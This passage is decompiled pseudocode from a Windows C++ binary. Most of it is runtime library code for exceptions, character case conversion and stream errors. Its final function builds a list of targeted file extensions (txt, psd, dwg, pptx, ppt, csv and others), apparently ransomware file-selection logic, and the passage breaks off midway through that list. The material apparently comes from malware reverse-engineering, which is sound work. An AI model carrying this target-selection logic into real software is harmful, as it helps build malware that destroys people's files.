  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &std::runtime_error::`vftable';
  return this;
}
// 4164FE: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 435334: using guessed type void *std::exception::`vftable';
// 435380: using guessed type void *std::runtime_error::`vftable';

//----- (00403CF0) --------------------------------------------------------
_DWORD *__thiscall sub_403CF0(_DWORD *Block, char a2)
{
  *Block = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_414AF8(Block);
  return Block;
}
// 4353B4: using guessed type void *std::_Facet_base::`vftable';

//----- (00403D20) --------------------------------------------------------
void __thiscall sub_403D20(volatile signed __int32 *this)
{
  _InterlockedIncrement(this + 1);
}

//----- (00403D30) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_403D30(volatile signed __int32 *this)
{
  volatile signed __int32 *result; // eax

  result = 0;
  if ( !_InterlockedExchangeAdd(this + 1, 0xFFFFFFFF) )
    return this;
  return result;
}

//----- (00403D50) --------------------------------------------------------
void __thiscall sub_403D50(_DWORD *this)
{
  *this = &std::_Facet_base::`vftable';
}
// 4353B4: using guessed type void *std::_Facet_base::`vftable';

//----- (00403D60) --------------------------------------------------------
void __thiscall sub_403D60(_DWORD *this)
{
  int v1; // ecx
  void (__thiscall ***v2)(_DWORD, int); // eax

  v1 = this[1];
  if ( v1 )
  {
    v2 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v1 + 8))(v1);
    if ( v2 )
      (**v2)(v2, 1);
  }
}

//----- (00403DB0) --------------------------------------------------------
int sub_403DB0()
{
  return 1;
}

//----- (00403DC0) --------------------------------------------------------
int __thiscall sub_403DC0(int this, unsigned __int8 a2)
{
  return _Tolower(a2, (const _Ctypevec *)(this + 8));
}

//----- (00403DE0) --------------------------------------------------------
_BYTE *__thiscall sub_403DE0(char *this, _BYTE *a2, unsigned int a3)
{
  _BYTE *v3; // esi
  int v4; // ebx
  int v5; // edi
  const _Ctypevec *v6; // eax
  char *v8; // [esp+18h] [ebp+Ch]

  v3 = a2;
  v4 = a3 - (_DWORD)a2;
  v5 = 0;
  if ( (unsigned int)a2 > a3 )
    v4 = 0;
  if ( v4 )
  {
    v6 = (const _Ctypevec *)(this + 8);
    v8 = this + 8;
    do
    {
      *v3 = _Tolower((unsigned __int8)*v3, v6);
      ++v5;
      v6 = (const _Ctypevec *)v8;
      ++v3;
    }
    while ( v5 != v4 );
  }
  return v3;
}

//----- (00403E30) --------------------------------------------------------
int __thiscall sub_403E30(int this, unsigned __int8 a2)
{
  return _Toupper(a2, (const _Ctypevec *)(this + 8));
}

//----- (00403E50) --------------------------------------------------------
_BYTE *__thiscall sub_403E50(char *this, _BYTE *a2, unsigned int a3)
{
  _BYTE *v3; // esi
  int v4; // ebx
  int v5; // edi
  const _Ctypevec *v6; // eax
  char *v8; // [esp+18h] [ebp+Ch]

  v3 = a2;
  v4 = a3 - (_DWORD)a2;
  v5 = 0;
  if ( (unsigned int)a2 > a3 )
    v4 = 0;
  if ( v4 )
  {
    v6 = (const _Ctypevec *)(this + 8);
    v8 = this + 8;
    do
    {
      *v3 = _Toupper((unsigned __int8)*v3, v6);
      ++v5;
      v6 = (const _Ctypevec *)v8;
      ++v3;
    }
    while ( v5 != v4 );
  }
  return v3;
}

//----- (00403EB0) --------------------------------------------------------
int __stdcall sub_403EB0(void *Src, int a2, void *a3)
{
  memmove_0(a3, Src, a2 - (_DWORD)Src);
  return a2;
}

//----- (00403EE0) --------------------------------------------------------
int __stdcall sub_403EE0(void *Src, int a2, int a3, void *a4)
{
  memmove_0(a4, Src, a2 - (_DWORD)Src);
  return a2;
}

//----- (00403F00) --------------------------------------------------------
void *__thiscall sub_403F00(void *Block, char a2)
{
  int v3; // eax

  v3 = *((_DWORD *)Block + 4);
  *(_DWORD *)Block = &std::ctype<char>::`vftable';
  if ( v3 <= 0 )
  {
    if ( v3 < 0 )
      j_j__free(*((void **)Block + 3));
  }
  else
  {
    free(*((void **)Block + 3));
  }
  free(*((void **)Block + 5));
  *(_DWORD *)Block = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_414AF8(Block);
  return Block;
}
// 4353B4: using guessed type void *std::_Facet_base::`vftable';
// 435F88: using guessed type void *std::ctype<char>::`vftable';

//----- (00403F80) --------------------------------------------------------
bool __thiscall sub_403F80(void *this, int a2, _DWORD *a3)
{
  _DWORD *v3; // eax
  char v5[8]; // [esp+4h] [ebp-8h] BYREF

  v3 = (_DWORD *)(*(int (__thiscall **)(void *, char *, int))(*(_DWORD *)this + 12))(this, v5, a2);
  return *(_DWORD *)(v3[1] + 4) == *(_DWORD *)(a3[1] + 4) && *v3 == *a3;
}
// 403F80: using guessed type char var_8[8];

//----- (00403FC0) --------------------------------------------------------
bool __thiscall sub_403FC0(_DWORD *this, _DWORD *a2, int a3)
{
  return this[1] == *(_DWORD *)(a2[1] + 4) && *a2 == a3;
}

//----- (00403FF0) --------------------------------------------------------
_DWORD *__cdecl sub_403FF0(_DWORD *a1, int a2)
{
  _DWORD *result; // eax

  if ( dword_4537F8 > *(_DWORD *)(*(_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + 4) )
  {
    _Init_thread_header(&dword_4537F8);
    if ( dword_4537F8 == -1 )
    {
      dword_45380C = 0;
      _Init_thread_footer(&dword_4537F8);
    }
  }
  if ( !std::_Execute_once(
          (struct std::once_flag *)&dword_45380C,
          (int (__stdcall *)(void *, void *, void **))sub_40C7A0,
          &unk_4537FC) )
    terminate();
  result = a1;
  *a1 = a2;
  a1[1] = &unk_4537FC;
  return result;
}
// 414C57: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 414C96: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 41C624: using guessed type void __noreturn terminate(void);
// 4537F8: using guessed type int dword_4537F8;

//----- (00404070) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __userpurge sub_404070@<eax>(int a1@<ecx>, int a2@<ebp>, int a3, int a4, _DWORD *a5)
{
  _DWORD *v6; // eax
  void *v7; // ecx
  unsigned int v8; // eax
  __m128i v9; // xmm1
  __m128i *v10; // ecx
  bool v11; // cf
  int v12; // eax
  unsigned int v13; // eax
  void *v14; // ecx
  unsigned int v15; // eax
  int result; // eax
  __m128i v17; // [esp-68h] [ebp-74h] BYREF
  __int64 v18; // [esp-58h] [ebp-64h]
  _DWORD v19[5]; // [esp-50h] [ebp-5Ch] BYREF
  unsigned int v20; // [esp-3Ch] [ebp-48h]
  __m128i v21; // [esp-38h] [ebp-44h] BYREF
  __int64 v22; // [esp-28h] [ebp-34h]
  int v23; // [esp-20h] [ebp-2Ch]
  __m128i *v24; // [esp-1Ch] [ebp-28h] BYREF
  char v25; // [esp-18h] [ebp-24h]
  int *v26; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h]
  void *v28; // [esp-8h] [ebp-14h]
  int v29; // [esp-4h] [ebp-10h]
  int v30; // [esp+0h] [ebp-Ch]
  int v31; // [esp+4h] [ebp-8h]
  int v32; // [esp+8h] [ebp-4h] BYREF
  int retaddr; // [esp+Ch] [ebp+0h]

  v30 = a2;
  v31 = retaddr;
  v29 = -1;
  v28 = &loc_433450;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v26 = &v32;
  v23 = a1;
  sub_401A10(&v21, a5);
  v23 = a3;
  v29 = 0;
  if ( (_DWORD)v22 )
    sub_4036D0((char **)&v21, ": ", 2u);
  (*(void (__thiscall **)(int, _DWORD *, int))(*(_DWORD *)a4 + 8))(a4, v19, v23);
  LOBYTE(v29) = 1;
  v6 = v19;
  ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)v19[4];
  if ( v20 >= 0x10 )
    v6 = (_DWORD *)v19[0];
  sub_4036D0((char **)&v21, v6, (size_t)ExceptionList);
  if ( v20 >= 0x10 )
  {
    v7 = (void *)v19[0];
    if ( v20 + 1 >= 0x1000 )
    {
      if ( (v19[0] & 0x1F) != 0 )
        goto LABEL_24;
      v8 = *(_DWORD *)(v19[0] - 4);
      if ( v8 >= v19[0] || v19[0] - v8 < 4 || v19[0] - v8 > 0x23 )
        goto LABEL_24;
      v7 = *(void **)(v19[0] - 4);
    }
    j__free(v7);
  }
  v9 = v21;
  v10 = &v17;
  *(_DWORD *)a1 = &std::exception::`vftable';
  v18 = v22;
  v11 = HIDWORD(v22) < 0x10;
  v12 = _mm_cvtsi128_si32(v9);
  *(_QWORD *)(a1 + 4) = 0i64;
  v17 = v9;
  if ( !v11 )
    v10 = (__m128i *)v12;
  v22 = 0xF00000000i64;
  v21.m128i_i8[0] = 0;
  v24 = v10;
  v25 = 1;
  __std_exception_copy(&v24, a1 + 4);
  v13 = HIDWORD(v18);
  *(_DWORD *)a1 = &std::runtime_error::`vftable';
  if ( v13 >= 0x10 )
  {
    v14 = (void *)v17.m128i_i32[0];
    if ( v13 + 1 < 0x1000 )
    {
LABEL_22:
      j__free(v14);
      goto LABEL_23;
    }
    if ( (v17.m128i_i8[0] & 0x1F) == 0 )
    {
      v15 = *(_DWORD *)(v17.m128i_i32[0] - 4);
      if ( v15 < v17.m128i_i32[0] && v17.m128i_i32[0] - v15 >= 4 && v17.m128i_i32[0] - v15 <= 0x23 )
      {
        v14 = *(void **)(v17.m128i_i32[0] - 4);
        goto LABEL_22;
      }
    }
LABEL_24:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_23:
  result = a1;
  *(_DWORD *)(a1 + 12) = a3;
  *(_DWORD *)a1 = &std::_System_error::`vftable';
  *(_DWORD *)(a1 + 16) = a4;
  return result;
}
// 404070: could not find valid save-restore pair for ebp
// 404070: could not find valid save-restore pair for edi
// 404070: could not find valid save-restore pair for esi
// 404108: bad sp value at call
// 4041A2: bad sp value at call
// 4164FE: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 435334: using guessed type void *std::exception::`vftable';
// 435380: using guessed type void *std::runtime_error::`vftable';
// 43538C: using guessed type void *std::_System_error::`vftable';

//----- (00404220) --------------------------------------------------------
char *__thiscall sub_404220(char *Block, char a2)
{
  *(_DWORD *)Block = &std::exception::`vftable';
  __std_exception_destroy(Block + 4);
  if ( (a2 & 1) != 0 )
    sub_414AF8(Block);
  return Block;
}
// 416561: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 435334: using guessed type void *std::exception::`vftable';

//----- (00404250) --------------------------------------------------------
const char *sub_404250()
{
  return "iostream";
}

//----- (00404260) --------------------------------------------------------
char **__stdcall sub_404260(char **a1, int a2)
{
  char *v3; // edx

  if ( a2 == 1 )
  {
    a1[4] = 0;
    a1[5] = (char *)15;
    *(_BYTE *)a1 = 0;
    sub_401D10(a1, "iostream stream error", 0x15u);
  }
  else
  {
    v3 = (char *)std::_Syserror_map(a2);
    a1[4] = 0;
    a1[5] = (char *)15;
    *(_BYTE *)a1 = 0;
    sub_401D10(a1, v3, strlen(v3));
  }
  return a1;
}

//----- (004042E0) --------------------------------------------------------
void *__thiscall sub_4042E0(void *Block, char a2)
{
  if ( (a2 & 1) != 0 )
    sub_414AF8(Block);
  return Block;
}

//----- (00404300) --------------------------------------------------------
_DWORD *__thiscall sub_404300(_DWORD *this, void *Src, int *a3)
{
  int v4; // edi
  int v5; // ebx
  void *v6; // ecx
  void *v7; // eax
  void *Block[5]; // [esp+10h] [ebp-28h] BYREF
  unsigned int v10; // [esp+24h] [ebp-14h]
  _DWORD *v11; // [esp+28h] [ebp-10h]
  int v12; // [esp+34h] [ebp-4h]
  int savedregs; // [esp+38h] [ebp+0h] BYREF

  v11 = this;
  Block[4] = 0;
  v10 = 15;
  v4 = *a3;
  v5 = a3[1];
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, Src, strlen((const char *)Src));
  v12 = 0;
  sub_404070((int)this, (int)&savedregs, v4, v5, Block);
  if ( v10 >= 0x10 )
  {
    v6 = Block[0];
    if ( v10 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0
        || (v7 = (void *)*((_DWORD *)Block[0] - 1), v7 >= Block[0])
        || (unsigned int)(Block[0] - v7) < 4
        || (unsigned int)(Block[0] - v7) > 0x23 )
      {
        _invalid_parameter_noinfo_noreturn();
      }
      v6 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v6);
  }
  *this = &std::ios_base::failure::`vftable';
  return this;
}
// 435FD4: using guessed type void *std::ios_base::failure::`vftable';

//----- (004043E0) --------------------------------------------------------
int __thiscall sub_4043E0(_DWORD *this, char a2, char a3)
{
  int result; // eax
  int v4; // ecx
  int *v5; // eax
  int *v6; // eax
  int *v7; // eax
  int v8[2]; // [esp+4h] [ebp-1Ch] BYREF
  int pExceptionObject[5]; // [esp+Ch] [ebp-14h] BYREF

  result = a2 & 0x17;
  this[3] = result;
  v4 = result & this[4];
  if ( v4 )
  {
    if ( !a3 )
    {
      if ( (v4 & 4) == 0 )
      {
        if ( (v4 & 2) == 0 )
        {
          v7 = sub_403FF0(v8, 1);
          sub_404300(pExceptionObject, "ios_base::eofbit set", v7);
          _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
        }
        v6 = sub_403FF0(v8, 1);
        sub_404300(pExceptionObject, "ios_base::failbit set", v6);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
      }
      v5 = sub_403FF0(v8, 1);
      sub_404300(pExceptionObject, "ios_base::badbit set", v5);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
    }
    _CxxThrowException(0, 0);
  }
  return result;
}
// 4043E0: using guessed type _DWORD var_1C[2];
// 4043E0: using guessed type _DWORD pExceptionObject[5];

//----- (004044A0) --------------------------------------------------------
char *__thiscall sub_4044A0(char *this, int a2)
{
  char *result; // eax

  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &std::_System_error::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  *((_DWORD *)this + 4) = *(_DWORD *)(a2 + 16);
  result = this;
  *(_DWORD *)this = &std::ios_base::failure::`vftable';
  return result;
}
// 4164FE: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 435334: using guessed type void *std::exception::`vftable';
// 43538C: using guessed type void *std::_System_error::`vftable';
// 435FD4: using guessed type void *std::ios_base::failure::`vftable';

//----- (004044F0) --------------------------------------------------------
char *__thiscall sub_4044F0(char *this, int a2)
{
  char *result; // eax

  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &std::_System_error::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  *((_DWORD *)this + 4) = *(_DWORD *)(a2 + 16);
  result = this;
  *(_DWORD *)this = &std::system_error::`vftable';
  return result;
}
// 4164FE: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 435334: using guessed type void *std::exception::`vftable';
// 43538C: using guessed type void *std::_System_error::`vftable';
// 435398: using guessed type void *std::system_error::`vftable';

//----- (00404540) --------------------------------------------------------
char *__thiscall sub_404540(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &std::_System_error::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  *((_DWORD *)this + 4) = *(_DWORD *)(a2 + 16);
  return this;
}
// 4164FE: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 435334: using guessed type void *std::exception::`vftable';
// 43538C: using guessed type void *std::_System_error::`vftable';

//----- (00404590) --------------------------------------------------------
struct std::ios_base *__thiscall sub_404590(struct std::ios_base *this, char a2)
{
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
  if ( (a2 & 1) != 0 )
    sub_414AF8(this);
  return this;
}
// 435FE0: using guessed type void *std::ios_base::`vftable';

//----- (00404600) --------------------------------------------------------
void sub_404600()
{
  int v0; // ecx
  void *v1; // ecx
  void *v2; // eax
  int v3; // ecx
  void *v4; // ecx
  void *v5; // eax
  int v6; // ecx
  void *v7; // ecx
  void *v8; // eax
  int v9; // ecx
  void *v10; // ecx
  void *v11; // eax
  int v12; // ecx
  void *v13; // ecx
  void *v14; // eax
  int v15; // ecx
  void *v16; // ecx
  void *v17; // eax
  int v18; // ecx
  void *v19; // ecx
  void *v20; // eax
  int v21; // ecx
  void *v22; // ecx
  void *v23; // eax
  int v24; // ecx
  void *v25; // ecx
  void *v26; // eax
  int v27; // ecx
  void *v28; // ecx
  void *v29; // eax
  int v30; // ecx
  void *v31; // ecx
  void *v32; // eax
  int v33; // ecx
  void *v34; // ecx
  void *v35; // eax
  int v36; // ecx
  void *v37; // ecx
  void *v38; // eax
  int v39; // ecx
  void *v40; // ecx
  void *v41; // eax
  int v42; // ecx
  void *v43; // ecx
  void *v44; // eax
  int v45; // ecx
  void *v46; // ecx
  void *v47; // eax
  int v48; // ecx
  void *v49; // ecx
  void *v50; // eax
  int v51; // ecx
  void *v52; // ecx
  void *v53; // eax
  int v54; // ecx
  void *v55; // ecx
  void *v56; // eax
  int v57; // ecx
  void *v58; // ecx
  void *v59; // eax
  int v60; // ecx
  void *v61; // ecx
  void *v62; // eax
  int v63; // ecx
  void *v64; // ecx
  void *v65; // eax
  int v66; // ecx
  void *v67; // ecx
  void *v68; // eax
  int v69; // ecx
  void *v70; // ecx
  void *v71; // eax
  int v72; // ecx
  void *v73; // ecx
  void *v74; // eax
  int v75; // ecx
  void *v76; // ecx
  void *v77; // eax
  int v78; // ecx
  void *v79; // ecx
  void *v80; // eax
  int v81; // ecx
  void *v82; // ecx
  void *v83; // eax
  int v84; // ecx
  void *v85; // ecx
  void *v86; // eax
  int v87; // ecx
  void *v88; // ecx
  void *v89; // eax
  int v90; // ecx
  void *v91; // ecx
  void *v92; // eax
  int v93; // ecx
  void *v94; // ecx
  void *v95; // eax
  int v96; // ecx
  void *v97; // ecx
  void *v98; // eax
  int v99; // ecx
  void *v100; // ecx
  void *v101; // eax
  int v102; // ecx
  void *v103; // ecx
  void *v104; // eax
  int v105; // ecx
  void *v106; // ecx
  void *v107; // eax
  int v108; // ecx
  void *v109; // ecx
  void *v110; // eax
  int v111; // ecx
  void *v112; // ecx
  void *v113; // eax
  int v114; // ecx
  void *v115; // ecx
  void *v116; // eax
  int v117; // ecx
  void *v118; // ecx
  void *v119; // eax
  int v120; // ecx
  void *v121; // ecx
  void *v122; // eax
  int v123; // ecx
  void *v124; // ecx
  void *v125; // eax
  int v126; // ecx
  void *v127; // ecx
  void *v128; // eax
  int v129; // ecx
  void *v130; // ecx
  void *v131; // eax
  int v132; // ecx
  void *v133; // ecx
  void *v134; // eax
  int v135; // ecx
  void *v136; // ecx
  void *v137; // eax
  int v138; // ecx
  void *v139; // ecx
  void *v140; // eax
  int v141; // ecx
  void *v142; // ecx
  void *v143; // eax
  int v144; // ecx
  char *v145[6]; // [esp+4h] [ebp-5B4h] BYREF
  char *v146[6]; // [esp+1Ch] [ebp-59Ch] BYREF
  char *v147[6]; // [esp+34h] [ebp-584h] BYREF
  char *v148[6]; // [esp+4Ch] [ebp-56Ch] BYREF
  char *v149[6]; // [esp+64h] [ebp-554h] BYREF
  char *v150[6]; // [esp+7Ch] [ebp-53Ch] BYREF
  char *v151[6]; // [esp+94h] [ebp-524h] BYREF
  char *v152[6]; // [esp+ACh] [ebp-50Ch] BYREF
  char *v153[6]; // [esp+C4h] [ebp-4F4h] BYREF
  char *v154[6]; // [esp+DCh] [ebp-4DCh] BYREF
  char *v155[6]; // [esp+F4h] [ebp-4C4h] BYREF
  char *v156[6]; // [esp+10Ch] [ebp-4ACh] BYREF
  char *v157[6]; // [esp+124h] [ebp-494h] BYREF
  char *v158[6]; // [esp+13Ch] [ebp-47Ch] BYREF
  char *v159[6]; // [esp+154h] [ebp-464h] BYREF
  char *v160[6]; // [esp+16Ch] [ebp-44Ch] BYREF
  char *v161[6]; // [esp+184h] [ebp-434h] BYREF
  char *v162[6]; // [esp+19Ch] [ebp-41Ch] BYREF
  char *v163[6]; // [esp+1B4h] [ebp-404h] BYREF
  char *v164[6]; // [esp+1CCh] [ebp-3ECh] BYREF
  char *v165[6]; // [esp+1E4h] [ebp-3D4h] BYREF
  char *v166[6]; // [esp+1FCh] [ebp-3BCh] BYREF
  char *v167[6]; // [esp+214h] [ebp-3A4h] BYREF
  char *v168[6]; // [esp+22Ch] [ebp-38Ch] BYREF
  char *v169[6]; // [esp+244h] [ebp-374h] BYREF
  char *v170[6]; // [esp+25Ch] [ebp-35Ch] BYREF
  char *v171[6]; // [esp+274h] [ebp-344h] BYREF
  char *v172[6]; // [esp+28Ch] [ebp-32Ch] BYREF
  char *v173[6]; // [esp+2A4h] [ebp-314h] BYREF
  char *v174[6]; // [esp+2BCh] [ebp-2FCh] BYREF
  char *v175[6]; // [esp+2D4h] [ebp-2E4h] BYREF
  char *v176[6]; // [esp+2ECh] [ebp-2CCh] BYREF
  char *v177[6]; // [esp+304h] [ebp-2B4h] BYREF
  char *v178[6]; // [esp+31Ch] [ebp-29Ch] BYREF
  char *v179[6]; // [esp+334h] [ebp-284h] BYREF
  char *v180[6]; // [esp+34Ch] [ebp-26Ch] BYREF
  char *v181[6]; // [esp+364h] [ebp-254h] BYREF
  char *v182[6]; // [esp+37Ch] [ebp-23Ch] BYREF
  char *v183[6]; // [esp+394h] [ebp-224h] BYREF
  char *v184[6]; // [esp+3ACh] [ebp-20Ch] BYREF
  char *v185[6]; // [esp+3C4h] [ebp-1F4h] BYREF
  char *v186[6]; // [esp+3DCh] [ebp-1DCh] BYREF
  char *v187[6]; // [esp+3F4h] [ebp-1C4h] BYREF
  char *v188[6]; // [esp+40Ch] [ebp-1ACh] BYREF
  char *v189[6]; // [esp+424h] [ebp-194h] BYREF
  char *v190[6]; // [esp+43Ch] [ebp-17Ch] BYREF
  char *v191[6]; // [esp+454h] [ebp-164h] BYREF
  char *v192[6]; // [esp+46Ch] [ebp-14Ch] BYREF
  char *v193[6]; // [esp+484h] [ebp-134h] BYREF
  char *v194[6]; // [esp+49Ch] [ebp-11Ch] BYREF
  char *v195[6]; // [esp+4B4h] [ebp-104h] BYREF
  char *v196[6]; // [esp+4CCh] [ebp-ECh] BYREF
  char *v197[6]; // [esp+4E4h] [ebp-D4h] BYREF
  char *v198[6]; // [esp+4FCh] [ebp-BCh] BYREF
  char *v199[6]; // [esp+514h] [ebp-A4h] BYREF
  char *v200[6]; // [esp+52Ch] [ebp-8Ch] BYREF
  char *v201[6]; // [esp+544h] [ebp-74h] BYREF
  char *v202[6]; // [esp+55Ch] [ebp-5Ch] BYREF
  char *v203[6]; // [esp+574h] [ebp-44h] BYREF
  void *Block[4]; // [esp+58Ch] [ebp-2Ch] BYREF
  int v205; // [esp+59Ch] [ebp-1Ch]
  unsigned int v206; // [esp+5A0h] [ebp-18h]
  char v207[4]; // [esp+5A4h] [ebp-14h] BYREF
  int v208; // [esp+5A8h] [ebp-10h]
  int v209; // [esp+5B4h] [ebp-4h]

  v209 = 0;
  sub_401AB0(*((_DWORD **)dword_45384C + 1));
  *((_DWORD *)dword_45384C + 1) = dword_45384C;
  *(_DWORD *)dword_45384C = dword_45384C;
  *((_DWORD *)dword_45384C + 2) = dword_45384C;
  dword_453850 = 0;
  v209 = 1;
  sub_401AB0(*((_DWORD **)dword_453844 + 1));
  *((_DWORD *)dword_453844 + 1) = dword_453844;
  *(_DWORD *)dword_453844 = dword_453844;
  v209 = -1;
  v205 = 0;
  v206 = 15;
  *((_DWORD *)dword_453844 + 2) = dword_453844;
  dword_453848 = 0;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "txt", 3u);
  v209 = 2;
  sub_40C7C0(&dword_45384C, (int)v207, v0, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v1 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v2 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v2 >= Block[0] || (unsigned int)(Block[0] - v2) < 4 || (unsigned int)(Block[0] - v2) > 0x23 )
        goto LABEL_388;
      v1 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v1);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "psd", 3u);
  v209 = 3;
  sub_40C7C0(&dword_45384C, (int)v207, v3, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v4 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v5 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v5 >= Block[0] || (unsigned int)(Block[0] - v5) < 4 || (unsigned int)(Block[0] - v5) > 0x23 )
        goto LABEL_388;
      v4 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v4);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "dwg", 3u);
  v209 = 4;
  sub_40C7C0(&dword_45384C, (int)v207, v6, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v7 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v8 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v8 >= Block[0] || (unsigned int)(Block[0] - v8) < 4 || (unsigned int)(Block[0] - v8) > 0x23 )
        goto LABEL_388;
      v7 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v7);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "pptx", 4u);
  v209 = 5;
  sub_40C7C0(&dword_45384C, (int)v207, v9, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v10 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v11 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v11 >= Block[0] || (unsigned int)(Block[0] - v11) < 4 || (unsigned int)(Block[0] - v11) > 0x23 )
        goto LABEL_388;
      v10 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v10);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "pptm", 4u);
  v209 = 6;
  sub_40C7C0(&dword_45384C, (int)v207, v12, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v13 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v14 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v14 >= Block[0] || (unsigned int)(Block[0] - v14) < 4 || (unsigned int)(Block[0] - v14) > 0x23 )
        goto LABEL_388;
      v13 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v13);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "ppt", 3u);
  v209 = 7;
  sub_40C7C0(&dword_45384C, (int)v207, v15, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v16 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v17 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v17 >= Block[0] || (unsigned int)(Block[0] - v17) < 4 || (unsigned int)(Block[0] - v17) > 0x23 )
        goto LABEL_388;
      v16 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v16);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "pps", 3u);
  v209 = 8;
  sub_40C7C0(&dword_45384C, (int)v207, v18, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v19 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v20 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v20 >= Block[0] || (unsigned int)(Block[0] - v20) < 4 || (unsigned int)(Block[0] - v20) > 0x23 )
        goto LABEL_388;
      v19 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v19);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "602", 3u);
  v209 = 9;
  sub_40C7C0(&dword_45384C, (int)v207, v21, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v22 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v23 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v23 >= Block[0] || (unsigned int)(Block[0] - v23) < 4 || (unsigned int)(Block[0] - v23) > 0x23 )
        goto LABEL_388;
      v22 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v22);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "csv", 3u);
  v209 = 10;
  sub_40C7C0(&dword_45384C, (int)v207, v24, Block, v208);
